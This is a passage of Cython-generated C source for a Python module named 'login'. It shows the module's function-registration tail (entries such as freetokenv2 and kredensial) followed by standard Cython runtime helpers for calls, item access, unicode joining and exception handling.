  if (PyDict_SetItem(__pyx_d, __pyx_n_s_freetokenv2, __pyx_t_1) < 0) __PYX_ERR(0, 192, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_5login_17kredensial, 0, __pyx_n_s_kredensial, NULL, __pyx_n_s_login, __pyx_d, ((PyObject *)__pyx_codeobj__43)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 214, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_kredensial, __pyx_t_1) < 0) __PYX_ERR(0, 214, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_5login_19convert, 0, __pyx_n_s_convert, NULL, __pyx_n_s_login, __pyx_d, ((PyObject *)__pyx_codeobj__45)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 245, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_convert, __pyx_t_1) < 0) __PYX_ERR(0, 245, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_5login_21real_time, 0, __pyx_n_s_real_time, NULL, __pyx_n_s_login, __pyx_d, ((PyObject *)__pyx_codeobj__47)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 249, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_real_time, __pyx_t_1) < 0) __PYX_ERR(0, 249, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_test, __pyx_t_1) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  

  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_9);
  __Pyx_XDECREF(__pyx_t_10);
  __Pyx_XDECREF(__pyx_t_13);
  if (__pyx_m) {
    if (__pyx_d) {
      __Pyx_AddTraceback("init login", __pyx_clineno, __pyx_lineno, __pyx_filename);
    }
    Py_CLEAR(__pyx_m);
  } else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_ImportError, "init login");
  }
  __pyx_L0:;
  __Pyx_RefNannyFinishContext();
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  return (__pyx_m != NULL) ? 0 : -1;
  #elif PY_MAJOR_VERSION >= 3
  return __pyx_m;
  #else
  return;
  #endif
}



#if CYTHON_REFNANNY
static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname) {
    PyObject *m = NULL, *p = NULL;
    void *r = NULL;
    m = PyImport_ImportModule(modname);
    if (!m) goto end;
    p = PyObject_GetAttrString(m, "RefNannyAPI");
    if (!p) goto end;
    r = PyLong_AsVoidPtr(p);
end:
    Py_XDECREF(p);
    Py_XDECREF(m);
    return (__Pyx_RefNannyAPIStruct *)r;
}
#endif


#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name) {
    PyTypeObject* tp = Py_TYPE(obj);
    if (likely(tp->tp_getattro))
        return tp->tp_getattro(obj, attr_name);
#if PY_MAJOR_VERSION < 3
    if (likely(tp->tp_getattr))
        return tp->tp_getattr(obj, PyString_AS_STRING(attr_name));
#endif
    return PyObject_GetAttr(obj, attr_name);
}
#endif


static PyObject *__Pyx_GetBuiltinName(PyObject *name) {
    PyObject* result = __Pyx_PyObject_GetAttrStr(__pyx_b, name);
    if (unlikely(!result)) {
        PyErr_Format(PyExc_NameError,
#if PY_MAJOR_VERSION >= 3
            "name '%U' is not defined", name);
#else
            "name '%.200s' is not defined", PyString_AS_STRING(name));
#endif
    }
    return result;
}


#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    return likely(dict) ? __PYX_GET_DICT_VERSION(dict) : 0;
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj) {
    PyObject **dictptr = NULL;
    Py_ssize_t offset = Py_TYPE(obj)->tp_dictoffset;
    if (offset) {
#if CYTHON_COMPILING_IN_CPYTHON
        dictptr = (likely(offset > 0)) ? (PyObject **) ((char *)obj + offset) : _PyObject_GetDictPtr(obj);
#else
        dictptr = _PyObject_GetDictPtr(obj);
#endif
    }
    return (dictptr && *dictptr) ? __PYX_GET_DICT_VERSION(*dictptr) : 0;
}
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    if (unlikely(!dict) || unlikely(tp_dict_version != __PYX_GET_DICT_VERSION(dict)))
        return 0;
    return obj_dict_version == __Pyx_get_object_dict_version(obj);
}
#endif


#if CYTHON_USE_DICT_VERSIONS
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value)
#else
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name)
#endif
{
    PyObject *result;
#if !CYTHON_AVOID_BORROWED_REFS
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1
    result = _PyDict_GetItem_KnownHash(__pyx_d, name, ((PyASCIIObject *) name)->hash);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    } else if (unlikely(PyErr_Occurred())) {
        return NULL;
    }
#else
    result = PyDict_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
#endif
#else
    result = PyObject_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
    PyErr_Clear();
#endif
    return __Pyx_GetBuiltinName(name);
}


#if CYTHON_FAST_PYCCALL
static CYTHON_INLINE PyObject * __Pyx_PyCFunction_FastCall(PyObject *func_obj, PyObject **args, Py_ssize_t nargs) {
    PyCFunctionObject *func = (PyCFunctionObject*)func_obj;
    PyCFunction meth = PyCFunction_GET_FUNCTION(func);
    PyObject *self = PyCFunction_GET_SELF(func);
    int flags = PyCFunction_GET_FLAGS(func);
    assert(PyCFunction_Check(func));
    assert(METH_FASTCALL == (flags & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)));
    assert(nargs >= 0);
    assert(nargs == 0 || args != NULL);
    /* _PyCFunction_FastCallDict() must not be called with an exception set,
       because it may clear it (directly or indirectly) and so the
       caller loses its exception */
    assert(!PyErr_Occurred());
    if ((PY_VERSION_HEX < 0x030700A0) || unlikely(flags & METH_KEYWORDS)) {
        return (*((__Pyx_PyCFunctionFastWithKeywords)(void*)meth)) (self, args, nargs, NULL);
    } else {
        return (*((__Pyx_PyCFunctionFast)(void*)meth)) (self, args, nargs);
    }
}
#endif


#if CYTHON_FAST_PYCALL
static PyObject* __Pyx_PyFunction_FastCallNoKw(PyCodeObject *co, PyObject **args, Py_ssize_t na,
                                               PyObject *globals) {
    PyFrameObject *f;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject **fastlocals;
    Py_ssize_t i;
    PyObject *result;
    assert(globals != NULL);
    /* XXX Perhaps we should create a specialized
       PyFrame_New() that doesn't take locals, but does
       take builtins without sanity checking them.
       */
    assert(tstate != NULL);
    f = PyFrame_New(tstate, co, globals, NULL);
    if (f == NULL) {
        return NULL;
    }
    fastlocals = __Pyx_PyFrame_GetLocalsplus(f);
    for (i = 0; i < na; i++) {
        Py_INCREF(*args);
        fastlocals[i] = *args++;
    }
    result = PyEval_EvalFrameEx(f,0);
    ++tstate->recursion_depth;
    Py_DECREF(f);
    --tstate->recursion_depth;
    return result;
}
#if 1 || PY_VERSION_HEX < 0x030600B1
static PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs) {
    PyCodeObject *co = (PyCodeObject *)PyFunction_GET_CODE(func);
    PyObject *globals = PyFunction_GET_GLOBALS(func);
    PyObject *argdefs = PyFunction_GET_DEFAULTS(func);
    PyObject *closure;
#if PY_MAJOR_VERSION >= 3
    PyObject *kwdefs;
#endif
    PyObject *kwtuple, **k;
    PyObject **d;
    Py_ssize_t nd;
    Py_ssize_t nk;
    PyObject *result;
    assert(kwargs == NULL || PyDict_Check(kwargs));
    nk = kwargs ? PyDict_Size(kwargs) : 0;
    if (Py_EnterRecursiveCall((char*)" while calling a Python object")) {
        return NULL;
    }
    if (
#if PY_MAJOR_VERSION >= 3
            co->co_kwonlyargcount == 0 &&
#endif
            likely(kwargs == NULL || nk == 0) &&
            co->co_flags == (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)) {
        if (argdefs == NULL && co->co_argcount == nargs) {
            result = __Pyx_PyFunction_FastCallNoKw(co, args, nargs, globals);
            goto done;
        }
        else if (nargs == 0 && argdefs != NULL
                 && co->co_argcount == Py_SIZE(argdefs)) {
            /* function called with no arguments, but all parameters have
               a default value: use default values as arguments .*/
            args = &PyTuple_GET_ITEM(argdefs, 0);
            result =__Pyx_PyFunction_FastCallNoKw(co, args, Py_SIZE(argdefs), globals);
            goto done;
        }
    }
    if (kwargs != NULL) {
        Py_ssize_t pos, i;
        kwtuple = PyTuple_New(2 * nk);
        if (kwtuple == NULL) {
            result = NULL;
            goto done;
        }
        k = &PyTuple_GET_ITEM(kwtuple, 0);
        pos = i = 0;
        while (PyDict_Next(kwargs, &pos, &k[i], &k[i+1])) {
            Py_INCREF(k[i]);
            Py_INCREF(k[i+1]);
            i += 2;
        }
        nk = i / 2;
    }
    else {
        kwtuple = NULL;
        k = NULL;
    }
    closure = PyFunction_GET_CLOSURE(func);
#if PY_MAJOR_VERSION >= 3
    kwdefs = PyFunction_GET_KW_DEFAULTS(func);
#endif
    if (argdefs != NULL) {
        d = &PyTuple_GET_ITEM(argdefs, 0);
        nd = Py_SIZE(argdefs);
    }
    else {
        d = NULL;
        nd = 0;
    }
#if PY_MAJOR_VERSION >= 3
    result = PyEval_EvalCodeEx((PyObject*)co, globals, (PyObject *)NULL,
                               args, (int)nargs,
                               k, (int)nk,
                               d, (int)nd, kwdefs, closure);
#else
    result = PyEval_EvalCodeEx(co, globals, (PyObject *)NULL,
                               args, (int)nargs,
                               k, (int)nk,
                               d, (int)nd, closure);
#endif
    Py_XDECREF(kwtuple);
done:
    Py_LeaveRecursiveCall();
    return result;
}
#endif
#endif


#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw) {
    PyObject *result;
    ternaryfunc call = Py_TYPE(func)->tp_call;
    if (unlikely(!call))
        return PyObject_Call(func, arg, kw);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = (*call)(func, arg, kw);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif


static CYTHON_UNUSED PyObject* __Pyx_PyObject_Call2Args(PyObject* function, PyObject* arg1, PyObject* arg2) {
    PyObject *args, *result = NULL;
    #if CYTHON_FAST_PYCALL
    if (PyFunction_Check(function)) {
        PyObject *args[2] = {arg1, arg2};
        return __Pyx_PyFunction_FastCall(function, args, 2);
    }
    #endif
    #if CYTHON_FAST_PYCCALL
    if (__Pyx_PyFastCFunction_Check(function)) {
        PyObject *args[2] = {arg1, arg2};
        return __Pyx_PyCFunction_FastCall(function, args, 2);
    }
    #endif
    args = PyTuple_New(2);
    if (unlikely(!args)) goto done;
    Py_INCREF(arg1);
    PyTuple_SET_ITEM(args, 0, arg1);
    Py_INCREF(arg2);
    PyTuple_SET_ITEM(args, 1, arg2);
    Py_INCREF(function);
    result = __Pyx_PyObject_Call(function, args, NULL);
    Py_DECREF(args);
    Py_DECREF(function);
done:
    return result;
}


#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg) {
    PyObject *self, *result;
    PyCFunction cfunc;
    cfunc = PyCFunction_GET_FUNCTION(func);
    self = PyCFunction_GET_SELF(func);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = cfunc(self, arg);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif


#if CYTHON_COMPILING_IN_CPYTHON
static PyObject* __Pyx__PyObject_CallOneArg(PyObject *func, PyObject *arg) {
    PyObject *result;
    PyObject *args = PyTuple_New(1);
    if (unlikely(!args)) return NULL;
    Py_INCREF(arg);
    PyTuple_SET_ITEM(args, 0, arg);
    result = __Pyx_PyObject_Call(func, args, NULL);
    Py_DECREF(args);
    return result;
}
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {
#if CYTHON_FAST_PYCALL
    if (PyFunction_Check(func)) {
        return __Pyx_PyFunction_FastCall(func, &arg, 1);
    }
#endif
    if (likely(PyCFunction_Check(func))) {
        if (likely(PyCFunction_GET_FLAGS(func) & METH_O)) {
            return __Pyx_PyObject_CallMethO(func, arg);
#if CYTHON_FAST_PYCCALL
        } else if (__Pyx_PyFastCFunction_Check(func)) {
            return __Pyx_PyCFunction_FastCall(func, &arg, 1);
#endif
        }
    }
    return __Pyx__PyObject_CallOneArg(func, arg);
}
#else
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {
    PyObject *result;
    PyObject *args = PyTuple_Pack(1, arg);
    if (unlikely(!args)) return NULL;
    result = __Pyx_PyObject_Call(func, args, NULL);
    Py_DECREF(args);
    return result;
}
#endif


static PyObject* __Pyx_PyUnicode_Join(PyObject* value_tuple, Py_ssize_t value_count, Py_ssize_t result_ulength,
                                      CYTHON_UNUSED Py_UCS4 max_char) {
#if CYTHON_USE_UNICODE_INTERNALS && CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    PyObject *result_uval;
    int result_ukind;
    Py_ssize_t i, char_pos;
    void *result_udata;
#if CYTHON_PEP393_ENABLED
    result_uval = PyUnicode_New(result_ulength, max_char);
    if (unlikely(!result_uval)) return NULL;
    result_ukind = (max_char <= 255) ? PyUnicode_1BYTE_KIND : (max_char <= 65535) ? PyUnicode_2BYTE_KIND : PyUnicode_4BYTE_KIND;
    result_udata = PyUnicode_DATA(result_uval);
#else
    result_uval = PyUnicode_FromUnicode(NULL, result_ulength);
    if (unlikely(!result_uval)) return NULL;
    result_ukind = sizeof(Py_UNICODE);
    result_udata = PyUnicode_AS_UNICODE(result_uval);
#endif
    char_pos = 0;
    for (i=0; i < value_count; i++) {
        int ukind;
        Py_ssize_t ulength;
        void *udata;
        PyObject *uval = PyTuple_GET_ITEM(value_tuple, i);
        if (unlikely(__Pyx_PyUnicode_READY(uval)))
            goto bad;
        ulength = __Pyx_PyUnicode_GET_LENGTH(uval);
        if (unlikely(!ulength))
            continue;
        if (unlikely(char_pos + ulength < 0))
            goto overflow;
        ukind = __Pyx_PyUnicode_KIND(uval);
        udata = __Pyx_PyUnicode_DATA(uval);
        if (!CYTHON_PEP393_ENABLED || ukind == result_ukind) {
            memcpy((char *)result_udata + char_pos * result_ukind, udata, (size_t) (ulength * result_ukind));
        } else {
            #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030300F0 || defined(_PyUnicode_FastCopyCharacters)
            _PyUnicode_FastCopyCharacters(result_uval, char_pos, uval, 0, ulength);
            #else
            Py_ssize_t j;
            for (j=0; j < ulength; j++) {
                Py_UCS4 uchar = __Pyx_PyUnicode_READ(ukind, udata, j);
                __Pyx_PyUnicode_WRITE(result_ukind, result_udata, char_pos+j, uchar);
            }
            #endif
        }
        char_pos += ulength;
    }
    return result_uval;
overflow:
    PyErr_SetString(PyExc_OverflowError, "join() result is too long for a Python string");
bad:
    Py_DECREF(result_uval);
    return NULL;
#else
    result_ulength++;
    value_count++;
    return PyUnicode_Join(__pyx_empty_unicode, value_tuple);
#endif
}


static CYTHON_INLINE void __Pyx_RaiseTooManyValuesError(Py_ssize_t expected) {
    PyErr_Format(PyExc_ValueError,
                 "too many values to unpack (expected %" CYTHON_FORMAT_SSIZE_T "d)", expected);
}


static CYTHON_INLINE void __Pyx_RaiseNeedMoreValuesError(Py_ssize_t index) {
    PyErr_Format(PyExc_ValueError,
                 "need more than %" CYTHON_FORMAT_SSIZE_T "d value%.1s to unpack",
                 index, (index == 1) ? "" : "s");
}


static CYTHON_INLINE int __Pyx_IterFinish(void) {
#if CYTHON_FAST_THREAD_STATE
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject* exc_type = tstate->curexc_type;
    if (unlikely(exc_type)) {
        if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) {
            PyObject *exc_value, *exc_tb;
            exc_value = tstate->curexc_value;
            exc_tb = tstate->curexc_traceback;
            tstate->curexc_type = 0;
            tstate->curexc_value = 0;
            tstate->curexc_traceback = 0;
            Py_DECREF(exc_type);
            Py_XDECREF(exc_value);
            Py_XDECREF(exc_tb);
            return 0;
        } else {
            return -1;
        }
    }
    return 0;
#else
    if (unlikely(PyErr_Occurred())) {
        if (likely(PyErr_ExceptionMatches(PyExc_StopIteration))) {
            PyErr_Clear();
            return 0;
        } else {
            return -1;
        }
    }
    return 0;
#endif
}


static int __Pyx_IternextUnpackEndCheck(PyObject *retval, Py_ssize_t expected) {
    if (unlikely(retval)) {
        Py_DECREF(retval);
        __Pyx_RaiseTooManyValuesError(expected);
        return -1;
    } else {
        return __Pyx_IterFinish();
    }
    return 0;
}


static PyObject *__Pyx_GetItemInt_Generic(PyObject *o, PyObject* j) {
    PyObject *r;
    if (!j) return NULL;
    r = PyObject_GetItem(o, j);
    Py_DECREF(j);
    return r;
}
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_List_Fast(PyObject *o, Py_ssize_t i,
                                                              CYTHON_NCP_UNUSED int wraparound,
                                                              CYTHON_NCP_UNUSED int boundscheck) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    Py_ssize_t wrapped_i = i;
    if (wraparound & unlikely(i < 0)) {
        wrapped_i += PyList_GET_SIZE(o);
    }
    if ((!boundscheck) || likely(__Pyx_is_valid_index(wrapped_i, PyList_GET_SIZE(o)))) {
        PyObject *r = PyList_GET_ITEM(o, wrapped_i);
        Py_INCREF(r);
        return r;
    }
    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));
#else
    return PySequence_GetItem(o, i);
#endif
}
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Tuple_Fast(PyObject *o, Py_ssize_t i,
                                                              CYTHON_NCP_UNUSED int wraparound,
                                                              CYTHON_NCP_UNUSED int boundscheck) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    Py_ssize_t wrapped_i = i;
    if (wraparound & unlikely(i < 0)) {
        wrapped_i += PyTuple_GET_SIZE(o);
    }
    if ((!boundscheck) || likely(__Pyx_is_valid_index(wrapped_i, PyTuple_GET_SIZE(o)))) {
        PyObject *r = PyTuple_GET_ITEM(o, wrapped_i);
        Py_INCREF(r);
        return r;
    }
    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));
#else
    return PySequence_GetItem(o, i);
#endif
}
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Fast(PyObject *o, Py_ssize_t i, int is_list,
                                                     CYTHON_NCP_UNUSED int wraparound,
                                                     CYTHON_NCP_UNUSED int boundscheck) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS && CYTHON_USE_TYPE_SLOTS
    if (is_list || PyList_CheckExact(o)) {
        Py_ssize_t n = ((!wraparound) | likely(i >= 0)) ? i : i + PyList_GET_SIZE(o);
        if ((!boundscheck) || (likely(__Pyx_is_valid_index(n, PyList_GET_SIZE(o))))) {
            PyObject *r = PyList_GET_ITEM(o, n);
            Py_INCREF(r);
            return r;
        }
    }
    else if (PyTuple_CheckExact(o)) {
        Py_ssize_t n = ((!wraparound) | likely(i >= 0)) ? i : i + PyTuple_GET_SIZE(o);
        if ((!boundscheck) || likely(__Pyx_is_valid_index(n, PyTuple_GET_SIZE(o)))) {
            PyObject *r = PyTuple_GET_ITEM(o, n);
            Py_INCREF(r);
            return r;
        }
    } else {
        PySequenceMethods *m = Py_TYPE(o)->tp_as_sequence;
        if (likely(m && m->sq_item)) {
            if (wraparound && unlikely(i < 0) && likely(m->sq_length)) {
                Py_ssize_t l = m->sq_length(o);
                if (likely(l >= 0)) {
                    i += l;
                } else {
                    if (!PyErr_ExceptionMatches(PyExc_OverflowError))
                        return NULL;
                    PyErr_Clear();
                }
            }
            return m->sq_item(o, i);
        }
    }
#else
    if (is_list || PySequence_Check(o)) {
        return PySequence_GetItem(o, i);
    }
#endif
    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));
}


#if CYTHON_USE_TYPE_SLOTS
static PyObject *__Pyx_PyObject_GetIndex(PyObject *obj, PyObject* index) {
    PyObject *runerr;
    Py_ssize_t key_value;
    PySequenceMethods *m = Py_TYPE(obj)->tp_as_sequence;
    if (unlikely(!(m && m->sq_item))) {
        PyErr_Format(PyExc_TypeError, "'%.200s' object is not subscriptable", Py_TYPE(obj)->tp_name);
        return NULL;
    }
    key_value = __Pyx_PyIndex_AsSsize_t(index);
    if (likely(key_value != -1 || !(runerr = PyErr_Occurred()))) {
        return __Pyx_GetItemInt_Fast(obj, key_value, 0, 1, 1);
    }
    if (PyErr_GivenExceptionMatches(runerr, PyExc_OverflowError)) {
        PyErr_Clear();
        PyErr_Format(PyExc_IndexError, "cannot fit '%.200s' into an index-sized integer", Py_TYPE(index)->tp_name);
    }
    return NULL;
}
static PyObject *__Pyx_PyObject_GetItem(PyObject *obj, PyObject* key) {
    PyMappingMethods *m = Py_TYPE(obj)->tp_as_mapping;
    if (likely(m && m->mp_subscript)) {
        return m->mp_subscript(obj, key);
    }
    return __Pyx_PyObject_GetIndex(obj, key);
}
#endif


#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallNoArg(PyObject *func) {
#if CYTHON_FAST_PYCALL
    if (PyFunction_Check(func)) {
        return __Pyx_PyFunction_FastCall(func, NULL, 0);
    }
#endif
#ifdef __Pyx_CyFunction_USED
    if (likely(PyCFunction_Check(func) || __Pyx_CyFunction_Check(func)))
#else
    if (likely(PyCFunction_Check(func)))
#endif
    {
        if (likely(PyCFunction_GET_FLAGS(func) & METH_NOARGS)) {
            return __Pyx_PyObject_CallMethO(func, NULL);
        }
    }
    return __Pyx_PyObject_Call(func, __pyx_empty_tuple, NULL);
}
#endif


#if PY_MAJOR_VERSION >= 3 && !CYTHON_COMPILING_IN_PYPY
static PyObject *__Pyx_PyDict_GetItem(PyObject *d, PyObject* key) {
    PyObject *value;
    value = PyDict_GetItemWithError(d, key);
    if (unlikely(!value)) {
        if (!PyErr_Occurred()) {
            if (unlikely(PyTuple_Check(key))) {
                PyObject* args = PyTuple_Pack(1, key);
                if (likely(args)) {
                    PyErr_SetObject(PyExc_KeyError, args);
                    Py_DECREF(args);
                }
            } else {
                PyErr_SetObject(PyExc_KeyError, key);
            }
        }
        return NULL;
    }
    Py_INCREF(value);
    return value;
}
#endif


#if CYTHON_USE_EXC_INFO_STACK
static _PyErr_StackItem *
__Pyx_PyErr_GetTopmostException(PyThreadState *tstate)
{
    _PyErr_StackItem *exc_info = tstate->exc_info;
    while ((exc_info->exc_type == NULL || exc_info->exc_type == Py_None) &&
           exc_info->previous_item != NULL)
    {
        exc_info = exc_info->previous_item;
    }
    return exc_info;
}
#endif


#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    #if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = __Pyx_PyErr_GetTopmostException(tstate);
    *type = exc_info->exc_type;
    *value = exc_info->exc_value;
    *tb = exc_info->exc_traceback;
    #else
    *type = tstate->exc_type;
    *value = tstate->exc_value;
    *tb = tstate->exc_traceback;
    #endif
    Py_XINCREF(*type);
    Py_XINCREF(*value);
    Py_XINCREF(*tb);
}
static CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    #if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = tstate->exc_info;
    tmp_type = exc_info->exc_type;
    tmp_value = exc_info->exc_value;
    tmp_tb = exc_info->exc_traceback;
    exc_info->exc_type = type;
    exc_info->exc_value = value;
    exc_info->exc_traceback = tb;
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = type;
    tstate->exc_value = value;
    tstate->exc_traceback = tb;
    #endif
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
}
#endif


#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    tmp_type = tstate->curexc_type;
    tmp_value = tstate->curexc_value;
    tmp_tb = tstate->curexc_traceback;
    tstate->curexc_type = type;
    tstate->curexc_value = value;
    tstate->curexc_traceback = tb;
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
}
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    *type = tstate->curexc_type;
    *value = tstate->curexc_value;
    *tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
}
#endif


#if CYTHON_COMPILING_IN_CPYTHON
static int __Pyx_InBases(PyTypeObject *a, PyTypeObject *b) {
    while (a) {
        a = a->tp_base;
        if (a == b)
            return 1;
    }
    return b == &PyBaseObject_Type;
}
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b) {
    PyObject *mro;
    if (a == b) return 1;
    mro = a->tp_mro;
    if (likely(mro)) {
        Py_ssize_t i, n;
        n = PyTuple_GET_SIZE(mro);
        for (i = 0; i < n; i++) {
            if (PyTuple_GET_ITEM(mro, i) == (PyObject *)b)
                return 1;
        }
        return 0;
    }
    return __Pyx_InBases(a, b);
}
#if PY_MAJOR_VERSION == 2
static int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject* exc_type2) {
    PyObject *exception, *value, *tb;
    int res;
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ErrFetch(&exception, &value, &tb);
    res = exc_type1 ? PyObject_IsSubclass(err, exc_type1) : 0;
    if (unlikely(res == -1)) {
        PyErr_WriteUnraisable(err);
        res = 0;
    }
    if (!res) {
        res = PyObject_IsSubclass(err, exc_type2);
        if (unlikely(res == -1)) {
            PyErr_WriteUnraisable(err);
            res = 0;
        }
    }
    __Pyx_ErrRestore(exception, value, tb);
    return res;
}
#else
static CYTHON_INLINE int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject *exc_type2) {
    int res = exc_type1 ? __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type1) : 0;
    if (!res) {
        res = __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type2);
    }
    return res;
}
#endif
static int __Pyx_PyErr_GivenExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {
    Py_ssize_t i, n;
    assert(PyExceptionClass_Check(exc_type));
    n = PyTuple_GET_SIZE(tuple);
#if PY_MAJOR_VERSION >= 3
    for (i=0; i<n; i++) {
        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;
    }
#endif
    for (i=0; i<n; i++) {
        PyObject *t = PyTuple_GET_ITEM(tuple, i);
        #if PY_MAJOR_VERSION < 3
        if (likely(exc_type == t)) return 1;
        #endif
        if (likely(PyExceptionClass_Check(t))) {
            if (__Pyx_inner_PyErr_GivenExceptionMatches2(exc_type, NULL, t)) return 1;
        } else {
        }
    }
    return 0;
}
